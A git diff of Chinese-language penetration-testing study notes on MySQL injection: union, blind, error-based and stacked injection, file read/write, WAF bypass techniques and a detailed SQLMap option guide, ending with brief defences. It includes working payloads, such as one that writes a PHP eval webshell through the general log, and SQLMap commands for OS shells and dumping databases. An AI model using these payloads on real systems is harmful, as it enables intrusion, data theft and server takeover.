@@ -1,5 +1,7 @@
 # 渗透千万条,安全第一条
 
+[toc]
+
 **WARNING**
 
 1. 授权渗透,备份数据后渗透
@@ -356,6 +358,8 @@ into outfile()函数可以将字符串写入文件，此函数的执行也需要
 ## 注意:
 
 ==只有使用了union查询的情况下,才需要通过order by判断网站原有SQL语句查询的字段数,使用and则不需要!!!==
+
+
 
 ## 联合查询注入
 
@@ -753,9 +757,71 @@ and linestring (()select * from(select user() )a)b );
 
 如果是在修改密码之类的界面,需要先输入用户名或者原密码的情况下,旧数据和新数据同时输入,有可能会出现不报错的情况,此时==可以尝试在输入旧数据的输入框输入正确的数据,在新数据输入框中猜测后端查询语句,并构造注入,有可能会爆出错误从而直接利用报错注入拿到数据!!!==
 
+## 文件读写
+
+### 读文件
+
+select load_file("路径和文件名");
+load data infile() ;
+
+> load data infile 和 load data local infile ，不受 secure-file-priv 的限制 
+
+### 写文件
+
+```mysql
+SELECT "123" INTO OUTFILE "c:/123.txt";
+SELECT "123abc" INTO DUMPFILE "c:/123.txt";
+```
+
+注：dumpfile可以处理非可见字符。
+
+要使用union查询写文件，不能使用and或者or拼接写文件
+
+#### 条件
+
+1. 绝对路径
+2. `secure_file_priv `选项的值为空(my.ini文件中设置为`secure_file_priv=`
+   默认是NULL，可以通过my.conf/my.ini文件mysqld一栏里进行配置，配置完成后，重启便会生效。
+
+#### 文件上传思路步骤：
+
+1. 找到注入点
+2. 判断列数
+3. 猜测后端查询语句
+  4. 判断注入类型
+  5. 判断闭合符
+6. 构造注入
+   SELECT "123" INTO OUTFILE "c:/123.txt";
+   select * from t_xx where c_xx=(('xx')) union SELECT 1,2,"123" INTO OUTFILE "c:/123.txt";%23'))
+
+### 知识点拓展
+
+在能够直接执行sql语句的应用中，如何通过SQL语句写日志getshell（文件上传学了之后再看）
+
+```mysql
+SHOW VARIABLES LIKE '%general%';# 查看日志配置（开关、位置）
+set global general_log=on;# 开启日志
+set global general_log_file='C:/phpstudy/www/methehack.php';# 设置日志位置为网站
+目录
+select '<?php eval($_POST["a"]); ?>'#执行生成包含木马日志的查询
+```
+
 
 
 ## 表单注入
+
+### 表单注入思路
+
+1. 找到注入点
+2. 猜测后端查询语句
+   1. 猜测闭合符
+3. 判断列数
+4. 判断显示位
+5. 查版本号
+6. 查库名
+7. 查表名
+8. 查列名
+9. 查数据
 
 ### 表单注入之延时盲注
 
@@ -803,7 +869,9 @@ update users set passwd='ccc'and payload # ' where username="xxx"
 
 在盲注场景下,也可以使用带外注入
 
-dnslog.cn 
+**dnslog平台:**
+
+> dnslog.cn 
 
 1. dnslog带外注入的原理是什么?
 
@@ -845,66 +913,243 @@ LIKE注入的注入点在like的条件内
 select * from t_xxx where c_xx like '%xx注入点'
 ```
 
+## 堆叠注入
 
+概念:即一次性执行多条sql语句。
+
+多条语句要用分号;分隔
+
+前提条件：后端支持堆叠查询
 
 ## MySQL注入绕过
 
+- 编码字符串绕过
+  - char()
+  - 16进制编码绕过
+  - unhex绕过
+  - to_base64(),from_base64():MySQL5.6以后支持
+- 过滤绕过
+- 大小写绕过
+- 内外双写绕过
+- 内联注释绕过
+- %00等空白符嵌入绕过WAF
+- 超大数据包绕过
+- 双提交绕过
+- 异常请求方法绕过
 
+### 更多绕过姿势见"C:\Users\HE\tools\secNote\笔记\二阶段\Day30--SQL注入\SQLi绕过姿势整理.md"
 
+## SQLMap
 
+### 功能:
 
-## SQLMap的功能
+能够对多重不同数据库进行不同类型的注入,比如:
 
+1. 对不同数据库管理系统进行注入
+2. 查库表列和数据
+3. 注入读写文件
+4. 注入执行系统命令等
 
+### SQLMap的各个选项的作用
 
+- --level	探测登记,数值越高,等级越高,默认为1。在不确定哪个payload或者参数是注入点的时候，可以使用--level 2，此等级会弹出cookie。--level 3 会探测user-agent和referer头
 
+- -r test.txt   请求头注入
 
-## 文件读写
+- -v x 可以指定回显信息的复杂度,x范围是[0~6],数值越大,显示内容越多,默认显示等级为1
 
-### 读文件
+  > 0：只显示Python的tracebacks信息、错误信息[ERROR]和关键信息[CRITICAL]
+  > 1：同时显示普通信息[INFO]和警告信息[WARNING]
+  > 2：同时显示调试信息[DEBUG]
+  > 3：同时显示注入使用的攻击荷载
+  > 4：同时显示HTTP请求头
+  > 5：同时显示HTTP响应头
+  > 6：同时显示HTTP响应体
 
-select load_file("路径和文件名");
-load data infile() ;
+- --is-dba  判断当前用户是不是DBA(Database Administrator-数据库管理员)
 
-> load data infile 和 load data local infile ，不受 secure-file-priv 的限制 
+- --privileges查看权限
 
-### 写文件
+- --users列数据库的用户
 
-```mysql
-SELECT "123" INTO OUTFILE "c:/123.txt";
-SELECT "123abc" INTO DUMPFILE "c:/123.txt";
+- --current-user //当前用户
+
+- --current-db  获取当前数据库
+
+- --dump获取DBMS数据表项
+
+- --passwords查看密码
+
+- --os-shell获取os-shell
+
+- --os-pwn反弹shell
+
+- --os-cmd=whoami执行系统命令
+
+- --reg-read读取Windows系统注册表
+
+- --dbms=mysql oracle指定数据库.过waf,节省时间
+
+- --batch全部使用默认选择
+
+- --table -D "数据库" //列出数据库的表名
+
+- --columns -T "表名" -D "数据库" //获取表的列名
+
+- --dump -C "字段,字段" -T "表名" -D "数据库" //获取表中的数据，包含列
+
+- --file-read="c: /123.txt" 读文件 （前提是知道绝对路径）
+
+- --file-write="c:sql.txt" --file-dest="E:/Web/site/8.php" 写文件 （前提同样要知道绝对路径）
+
+- --sql-shell 获取sql-shell,但是只能执行select命令
+
+- --sql-query 直接执行sql语句
+
+-  --user-agent = ‘指定的user-agent’ 指定ua
+
+-  --cookie "xx=xx" 指定cookie
+
+-  --referer 
+
+- --random-agent 随机的一个user-agent
+
+- –proxy设置HTTP代理服务器位置 格式:–proxy http(s)😕/ip[端口]
+
+- --delay 0.5 过安全狗
+  sqlmap探测过程中会发送大量探测Payload到目标,如果默认情况过快的发包速度会导致目标预警。 为了避免这样的情况发生,可以在探测设置sqlmap发包延迟。默认情况下,不设置延迟
+
+-  --timeout 10.5设置超时;在考虑超时HTTP请求之前,可以指定等待的秒数。有效值是一个浮点数,比如10.5秒。默认是30秒
+
+- --randomize 参数名称  //设置随机参数;sqlmap可以指定要在每次请求期间随机更改其值得参数名称。长度和类型根据提供的原始值保持 一致
+
+- --flush-session 清除缓存
+
+- –-safe-url 隔一会就访问一下的安全URL
+
+- –-safe-post 访问安全URL时携带的POST数据
+
+- –-safe-req 从文件中载入安全HTTP请求
+
+- –-safe-freq 每次测试请求之后都会访问一下的安全URL
+
+### SQLMap渗透时的注意事项
+
+1. 不要使用拖库的选项
+2. 尽量不要注入有修改功能的注入点
+
+### SQLMap对url进行get注入
+
+#### 步骤
+
+1. 截取访问链接
+
+2. 找到注入点
+
+3. 查库名
+
+   ```python
+   python sqlmap.py -u "注入点" --current-db
+   ```
+
+4. 指定库名查表名
+
+   ```python
+   python sqlmap.py -u "注入点" -D 库名 --tables
+   ```
+
+5. 指定库名、表名查列名
+
+   ```python
+   python sqlmap.py -u "注入点" -D 库名 -T 表名 --columns
+   ```
+
+6. 获取sql-shell
+
+   ```python
+   python sqlmap.py -u "注入点" --sql-shell
+   ```
+
+7. 查记录
+
+   获取到sql-shell后,在shell中执行select语句即可查询
+
+   注意:sql-shell只能执行select语句
+
+### SQLMap表单注入
+
+```python
+python sqlmap.py -u "注入点" --from --batch  即可自动注入
 ```
 
-注：dumpfile可以处理非可见字符。
+### SQLMap对url进行POST注入
 
-要使用union查询写文件，不能使用and或者or拼接写文件
-
-#### 条件
-
-1. 绝对路径
-2. `secure_file_priv `选项的值为空(my.ini文件中设置为`secure_file_priv=`
-默认是NULL，可以通过my.conf/my.ini文件mysqld一栏里进行配置，配置完成后，重启便会生效。
-
-#### 文件上传思路步骤：
-
-1. 找到注入点
-2. 判断列数
-3. 猜测后端查询语句
-  1. 判断注入类型
-  2. 判断闭合符
-4. 构造注入
-    SELECT "123" INTO OUTFILE "c:/123.txt";
-    select * from t_xx where c_xx=(('xx')) union SELECT 1,2,"123" INTO OUTFILE "c:/123.txt";%23'))
-
-### 知识点拓展
-
-在能够直接执行sql语句的应用中，如何通过SQL语句写日志getshell（文件上传学了之后再看）
-
-```mysql
-SHOW VARIABLES LIKE '%general%';# 查看日志配置（开关、位置）
-set global general_log=on;# 开启日志
-set global general_log_file='C:/phpstudy/www/methehack.php';# 设置日志位置为网站
-目录
-select '<?php eval($_POST["a"]); ?>'#执行生成包含木马日志的查询
+```python
+python sqlmap.py -u "注入点" --data "变量名1=值1&变量名2=值2..."    #变量名即表单中输入框的name属性值    多个变量使用&符号分隔
 ```
+
+### SQLMap  http请求包注入
+
+```python
+sqlmap.py -r request.txt
+```
+
+
+
+### SQLMap头部注入
+
+#### cookie注入
+
+```
+python sqlmap.py -u "注入点" --level 2 --cookie "xx=xx"
+```
+
+#### user-agent、referer注入
+
+```python
+python sqlmap.py -u "注入点" --level 3 --user-agent
+python sqlmap.py -u "注入点" --level 2 --referer
+```
+
+
+
+### SQLMap伪静态注入
+
+url后面加*(星号)
+
+```python
+-u "http://host/index/*"
+```
+
+### SQLMap绕过WAF
+
+#### --temper选项绕过
+
+```python
+--temper space2morehash.py
+sqlmap目录中temper文件夹下有很多脚本,通过--temper 文件名.py调用,也可以自己编写temper脚本
+```
+
+#### 延时绕过
+
+```
+--delay = 2   设置延时为2秒,降低请求频率
+```
+
+#### 定期访问安全页面绕过
+
+```
+--safe-url 隔一段时间访问一下安全的url
+或
+--safe-freq 每次测试请求之后都会访问一下的安全URL
+```
+
+## SQLi的防御和修复
+
+1. 正确地采用安全的数据库连接方式,如php中的PDO或者MySQLi并使用预编译等技术
+2. 采用成熟的防注入框架(可以参考thinkphp、OWASP网站、Discuzz、WordPress等的防注入手段)
+3. 细节方面:
+   1. 对于提交的数字型参数,严格限制其数据类型
+   2. 注意特殊字符的转义
+   3. 避免存储过程出现注入
 
